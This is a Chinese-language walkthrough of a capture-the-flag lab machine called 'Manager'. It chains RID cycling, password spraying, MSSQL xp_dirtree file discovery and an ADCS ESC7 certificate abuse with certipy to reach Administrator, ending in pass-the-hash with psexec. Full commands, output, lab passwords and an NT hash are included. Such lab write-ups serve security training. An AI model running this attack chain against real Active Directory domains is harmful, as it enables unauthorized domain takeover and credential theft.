---
title: Manager
weight: 572
tags:
  - medium
  - windows
  - rid-cycling
  - adcs-esc7
  - mssql
---

## 00. 摘要

> 关键词：Guest账户、RID 爆破、MSSQL xp_dirtree、ESC7提权

<!--more-->

1. 使用 `Guest` 账户枚举 SMB 服务，发现受害机启用了 `Guest` 账户，但没有找到有价值的文件共享。
2. 使用 `Guest` 账户进行 RID 爆破，拿到域用户清单。
3. 使用常见弱密码进行爆破，拿到 `Operator` 账户的密码。
4. 使用 `Operator` 账户登录mssql，通过`xp_dirtree` 找到网站备份文件。
5. 在网站备份文件中找到 `raven` 账户
6. 使用 `raven` 账户枚举 ADCS 服务，发现存在 `ESC7` 漏洞。
7. 使用 `ESC7` 漏洞提权到 `Administrator`



## 01. 信息收集

使用 `rustscan` 进行端口扫描，发现如下开放端口

```bash
kali@kali[~]$ rustscan -u 5000 -a 10.10.11.236
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/player/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.236:53
Open 10.10.11.236:80
Open 10.10.11.236:88
Open 10.10.11.236:135
Open 10.10.11.236:139
Open 10.10.11.236:389
Open 10.10.11.236:445
Open 10.10.11.236:464
Open 10.10.11.236:593
Open 10.10.11.236:636
Open 10.10.11.236:1433
Open 10.10.11.236:3268
Open 10.10.11.236:3269
Open 10.10.11.236:5985
Open 10.10.11.236:9389
Open 10.10.11.236:49667
Open 10.10.11.236:49689
Open 10.10.11.236:49690
Open 10.10.11.236:49693
Open 10.10.11.236:49725
Open 10.10.11.236:49801
Open 10.10.11.236:52587
```

## 02. 使用Guest账户枚举 SMB服务

在没有任何账户的情况下，尝试使用Windows内置的Guest账户枚举SMB文件共享

发现虽然启用了 `Guest` 账户，但是只有默认共享 `IPC$` 的读取权限，没有什么有用的信息。

然后我们使用 `Guest` 账户进行RID爆破，枚举域用户名：

> [!note]
> RID爆破(RID Cycling)的原理是：由于 RIDs 是连续的，所以攻击者可以暴力破解或猜测 RIDs 和 SIDs 来枚举域对象

攻击过程如下

{{< asciinema file="rid_cycling.cast" poster="npt:0:24" markers="0.5: 探测匿名账户是否启用, 11.1: 探测来宾账户是否启用, 24.3:RID爆破拿到用户名, 15"  >}}

其中 `SidTypeUser` 代表用户，我们可以得到一份用户清单 `usernames.txt`

```
Administrator
Guest
krbtgt
DC01$
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

然后我们简单尝试一下常见弱口令（偏脑洞，需要积累此操作）

1. 密码与用户名相同 --> 失败
2. 密码是用户名大写 --> 失败
3. 密码是用户名小写 --> 成功

```bash
kali@kali[~]$ cat usernames.txt | awk '{ print  tolower($0) }' > passwords.txt
kali@kali[~]$ netexec smb 10.10.11.236 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\DC01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
```

我们得到了 `Operator` 账户的账号密码

```
username: Operator
password: operator
```

> [!note]
> 1. 使用 netexec 进行密码爆破的时候，需要设置 `--no-bruteforce` 这样可以在爆破的时候，用户名和密码一一对应，而不会每一个用户名都尝试一遍所有密码。
> 2. 设置 `--continue-on-success` 参数是为了爆破出所有的有效账户。如果不设置该参数，则会在爆破出第一个有效账户的时候，结束爆破。

先枚举 `Operator` 账户可以访问的smb文件共享，发现没有敏感文件可以访问。然后尝试用该账户访问mssql，发现可以成功访问

```bash
kali@kali[~]$ netexec mssql 10.10.11.236 -u Operator -p operator
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\Operator:operator
```

一并枚举 `winrm`、`ldap` 服务，发现还能访问 `ldap`
## 03. 使用Operator账户攻击MSSQL

我们先使用 `impacket-mssqlclient` 连上 mssql 数据库。

1. 尝试使用 `xp_cmdshell` 执行命令 --> 失败，报错数据库没有启用 `xp_cmdshell`
2. 尝试使用 `enable_xp_cmdshell` 启用 `xp_cmdshell` --> 失败，报错没有权限启用
3. 使用 `xp_dirtree` + `responder` 捕获 NetNTLM hash --> 捕获到的 NetNTLM hash 无法破解成明文
4. 使用 `xp_dirtree` 收集本机信息，一番寻找之后在网站跟目录下找到了网站的备份文件

> [!note]
> 注：在使用 `impacket-mssqlclient` 进行数据库连接的时候，记得添加 `-windows-auth`。
> MSSQL的认证方式主要可以分为以下两种：
>    1. MSSQL直接创建的数据库账户，由MSSQL通过账户密码直接认证
>    2. 具有MSSQL访问权限的域用户，基于Windows的身份认证机制进行认证
> 
> 由于我们的账户属于域用户，所以在登录的时候，需要使用基于Windows的身份认证方式。如果不添加 `-windows-auth` 会登录失败

```bash
kali@kali[~]$ impacket-mssqlclient 'Operator':'operator'@'10.10.11.236' -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
<省略...>
SQL (MANAGER\Operator  guest@master)> xp_dirtree \inetpub\wwwroot\
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1
contact.html                          1      1
css                                   1      0
images                                1      0
index.html                            1      1
js                                    1      0
service.html                          1      1
web.config                            1      1
website-backup-27-07-23-old.zip       1      1
```

我们从网站上下载该备份文件

```bash
kali@kali[~]$ wget http://10.10.11.236/website-backup-27-07-23-old.zip
```

解压之后，从 `.old-conf.xml` 文件中，找到了`raven`账户的账号密码

```
username: raven
password: R4v3nBe5tD3veloP3r!123
```

使用该账户进一步枚举，发现该账户有WINRM服务的权限

```bash
kali@kali[~]$ netexec winrm 10.10.11.202 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'    
WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

枚举 `ldap` 发现也有 `ldap` 服务的访问权限
## 04. ESC7提权

由于 `Operator` 和 `raven` 有 ldap 服务的访问权限，使用这两个账户进行 ADCS 域证书漏洞枚举。发现可以使用 `raven` 账户进行 `ESC7` 攻击 

```bash
kali@kali[~]$ certipy-ad find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

<省略...>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

从枚举结果可知，可以使用 `raven` 进行 `ESC7` 攻击，让我们详细分析下 `ESC7` 漏洞的原理：

`ESC7` 本质上通过滥用证书授权权限进行提权。该攻击方式的原理如下：

1. 如果账户具有 `ManageCA` 权限，我们可以将 `ManageCertificate` 权限分配给任何帐户。
2. 如果账户具有 `ManageCertificates` 权限，我们可以远程批准待处理的证书请求，绕过 `CA certificate manager approval` 的保护。
3. `SubCA` 是ADCS内置的证书模板，可以被 `ESC1` 攻击。但是只允许 `Domain Admins` 和 `Enterprise Admins` 注册。
4. 通过结合以上两个权限，我们对 `SubCA` 证书模板发起 `ESC1` 攻击 (由于我们没有注册权限，所以会遇到 `CERTSRV_E_TEMPLATE_DENIED` 错误)，我们记录下发起注册的ID和使用的私钥。然后使用 `ManageCertificates` 权限批准我们注册的证书  (根据上一步记下的ID进行批准)。最后我们根据ID和记录的私钥，检索刚刚批准颁发的证书，并用其进行身份认证。

注：`ESC1` 攻击原理可以阅读  **红队靶场笔记 01-Escape**

接下来我们利用 `ESC7` 漏洞提权到 `Administrator` 权限

第一步：通过 `ManageCa` 权限，赋予自己 `ManageCertificates` 权限 (使用 `-add-officer` 参数)

```bash
kali@kali[~]$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -add-officer raven
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

第二步： 使用 `SubCA` 证书模板，注册一个 `SAN` 为 `Administrator` 的证书

```bash
kali@kali[~]$ certipy-ad req -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -dc-ip 10.10.11.236 -template SubCA -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 20
Would you like to save the private key? (y/N) y
[*] Saved private key to 20.key
[-] Failed to request certificate
```

记下我们的 `Request ID` 并 (输入 y) 保留私钥

第三步：通过 `ManageCertificates` 权限发布刚刚申请失败的证书

```bash
kali@kali[~]$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -issue-request 20 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

第四步：通过 ID 和私钥文件，检索我们发布的证书

```bash
kali@kali[~]$ certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -retrieve 20     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 20
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '20.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

第五步：使用证书进行认证，拿到 `Administrator` 账户的 NT hash

```bash
kali@kali[~]$ certipy-ad auth -pfx administrator.pfx -username Administrator -domain manager.htb -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

现在我们有 Administrator 账户的NT hash了，可以使用 `psexec` 通过PTH连接到受害机器

```bash
kali@kali[~]$ impacket-psexec 'administrator@manager.htb' -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on manager.htb.....
[*] Found writable share ADMIN$
[*] Uploading file vDevPpBd.exe
[*] Opening SVCManager on manager.htb.....
[*] Creating service IlSN on manager.htb.....
[*] Starting service IlSN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

---
## 参考链接
1. 文章：使用Guest账户访问SMB
   https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#list-shared-folders
2. 文章：RID爆破
   https://www.thehacker.recipes/ad/recon/ms-rpc#rid-cycling
3. 文章：ADCS ESC7攻击
   https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-abusing-subca
4. 工具：NetExec
   https://github.com/Pennyw0rth/NetExec
5. 工具：Impacket
   https://github.com/fortra/impacket
6. 工具：evil-winrm
   https://github.com/Hackplayers/evil-winrm
7. 工具：RustScan
   https://github.com/RustScan/RustScan
8. 工具：Responder
   https://github.com/SpiderLabs/Responder
9. 工具：Certipy
   https://github.com/ly4k/Certipy

